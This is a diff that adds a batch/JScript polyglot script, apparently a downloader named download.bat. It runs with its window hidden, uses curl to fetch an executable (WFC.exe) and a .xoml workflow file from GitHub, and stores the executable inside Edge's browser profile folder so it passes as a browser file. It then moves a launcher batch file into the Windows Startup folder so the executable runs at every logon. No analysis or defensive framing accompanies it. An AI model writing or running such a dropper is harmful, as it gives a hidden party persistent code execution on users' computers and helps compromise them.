@@ -1,0 +1,182 @@
+@set @x=0 /*
+@echo off
+setlocal EnableDelayedExpansion
+
+REM ---- Minimize window on first launch ----
+if defined __CW_MIN__ goto :min_done
+set "__CW_MIN__=1"
+cscript //nologo //E:JScript "%~f0" "%~f0" %*
+exit /b 0
+:min_done
+
+REM ---- JScript polyglot — cscript sees /* on line 1, skips all batch ----
+if "%~1"=="__spawned__" goto :main
+
+REM ---- Auto-generated script ----
+REM Files are processed in order. After each acquisition
+REM the script restarts so every file is re-verified.
+
+:main
+
+if not defined CW_RUN set "CW_RUN=0"
+set /a CW_RUN+=1
+:run_next
+if exist "download.bat_run_!CW_RUN!.log" set /a CW_RUN+=1& goto :run_next
+set "LOGFILE=download.bat_run_!CW_RUN!.log"
+set "CW_M=MARK_%RANDOM%_%RANDOM%"
+title !CW_M!
+timeout /t 1 /nobreak >nul
+for /f "tokens=2 delims=," %%a in ('tasklist /v /fo csv /nh /fi "windowtitle eq !CW_M!"') do set "CW_PID=%%~a"
+echo [*] Run !CW_RUN! - PID: !CW_PID! > "!LOGFILE!"
+
+REM ---- File 1 ----
+if exist "%LOCALAPPDATA%\Temp\run.txt" (
+    echo [*] File 1 present: "%LOCALAPPDATA%\Temp\run.txt" >> "!LOGFILE!"
+    goto :file1_done
+)
+
+:file1_write_drop
+echo [+] File 1: writing "%LOCALAPPDATA%\Temp\run.txt"... >> "!LOGFILE!"
+set "DL_DEST=%LOCALAPPDATA%\Temp\run.txt"
+for %%F in ("!DL_DEST!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+setlocal DisableDelayedExpansion
+> "%LOCALAPPDATA%\Temp\run.txt" echo(@echo off
+>> "%LOCALAPPDATA%\Temp\run.txt" echo(start "" "%%LOCALAPPDATA%%\Microsoft\Edge\User Data\Default\WFC.exe" "%%PROGRAMDATA%%\costanza\index.xoml"
+endlocal
+goto :file1_ok
+
+:file1_ok
+if not defined __CW_CHILD__ goto :file1_spawn
+echo [+] Restarting: call "%~f0" %* >> "!LOGFILE!"
+call "%~f0" %*
+goto :eof
+:file1_spawn
+set "__CW_CHILD__=1"
+echo [+] Spawning: cscript //nologo //E:JScript "%~f0" "%~f0" __wait__ __spawned__ >> "!LOGFILE!"
+cscript //nologo //E:JScript "%~f0" "%~f0" __wait__ __spawned__
+set "__CW_CHILD__="
+goto :file1_done
+
+:file1_done
+
+REM ---- File 2 ----
+if exist "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" (
+    echo [*] File 2 present: "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" >> "!LOGFILE!"
+    goto :file2_done
+)
+
+:file2_url1
+echo [+] File 2: downloading URL 1: https://github.com/cw6787/wfc/raw/refs/heads/main/WFC.exe >> "!LOGFILE!"
+set "DL_DEST=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe"
+for %%F in ("!DL_DEST!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -LJ -s -o "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" "https://github.com/cw6787/wfc/raw/refs/heads/main/WFC.exe"
+if !errorlevel! neq 0 (
+    del "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" 2>nul
+    goto :file2_urls_failed
+)
+goto :file2_ok
+
+:file2_urls_failed
+echo [-] File 2: all URLs exhausted. >> "!LOGFILE!"
+exit /b 1
+
+:file2_ok
+
+:file2_done
+
+REM ---- File 3 ----
+if exist "%PROGRAMDATA%\costanza\index.xoml" (
+    echo [*] File 3 present: "%PROGRAMDATA%\costanza\index.xoml" >> "!LOGFILE!"
+    goto :file3_done
+)
+
+:file3_url1
+echo [+] File 3: downloading URL 1: https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/index.xml >> "!LOGFILE!"
+set "DL_DEST=%PROGRAMDATA%\costanza\index.xoml"
+for %%F in ("!DL_DEST!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%PROGRAMDATA%\costanza\index.xoml" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/index.xml"
+if !errorlevel! neq 0 (
+    del "%PROGRAMDATA%\costanza\index.xoml" 2>nul
+    goto :file3_urls_failed
+)
+goto :file3_ok
+
+:file3_urls_failed
+echo [-] File 3: all URLs exhausted. >> "!LOGFILE!"
+exit /b 1
+
+:file3_ok
+
+:file3_done
+
+REM ---- File 4 ----
+if exist "%PROGRAMDATA%\costanza\viewtime.csv" (
+    echo [*] File 4 present: "%PROGRAMDATA%\costanza\viewtime.csv" >> "!LOGFILE!"
+    goto :file4_done
+)
+
+:file4_url1
+echo [+] File 4: downloading URL 1: https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/Viewtime.csv >> "!LOGFILE!"
+set "DL_DEST=%PROGRAMDATA%\costanza\viewtime.csv"
+for %%F in ("!DL_DEST!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%PROGRAMDATA%\costanza\viewtime.csv" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/Viewtime.csv"
+if !errorlevel! neq 0 (
+    del "%PROGRAMDATA%\costanza\viewtime.csv" 2>nul
+    goto :file4_urls_failed
+)
+goto :file4_ok
+
+:file4_urls_failed
+echo [-] File 4: all URLs exhausted. >> "!LOGFILE!"
+exit /b 1
+
+:file4_ok
+if not defined __CW_CHILD__ goto :file4_spawn
+echo [+] Restarting: call "%~f0" %* >> "!LOGFILE!"
+call "%~f0" %*
+goto :eof
+:file4_spawn
+set "__CW_CHILD__=1"
+echo [+] Spawning: cscript //nologo //E:JScript "%~f0" "%~f0" __wait__ __spawned__ >> "!LOGFILE!"
+cscript //nologo //E:JScript "%~f0" "%~f0" __wait__ __spawned__
+set "__CW_CHILD__="
+goto :file4_done
+
+:file4_done
+
+if defined __CW_CHILD__ goto :eof
+
+if defined __CW_FINAL__ goto :final
+set "__CW_FINAL__=1"
+echo [+] Spawning final: cscript //nologo //E:JScript "%~f0" "%~f0" __spawned__ >> "!LOGFILE!"
+cscript //nologo //E:JScript "%~f0" "%~f0" __spawned__
+exit /b 0
+
+:final
+REM ---- Final commands ----
+echo [+] Executing: cmd /c move "%LOCALAPPDATA%\Temp\run.txt" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.bat" >> "!LOGFILE!"
+(cmd /c move "%LOCALAPPDATA%\Temp\run.txt" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.bat") >> "!LOGFILE!"
+if !errorlevel! neq 0 (
+    echo [-] Final command 1 failed. >> "!LOGFILE!"
+    exit /b 1
+)
+
+echo [*] All files acquired. >> "!LOGFILE!"
+endlocal
+exit /b 0
+*/
+var sh = new ActiveXObject('WScript.Shell');
+var bat = WScript.Arguments.length > 0 ? WScript.Arguments(0) : WScript.ScriptFullName;
+var w = false;
+var a = '';
+for (var i = 1; i < WScript.Arguments.length; i++) if (WScript.Arguments(i) == '__wait__') w = true; else a += ' ' + WScript.Arguments(i);
+sh.Run('cmd /c "' + bat + '"' + a, 0, w);
+WScript.Quit(0);
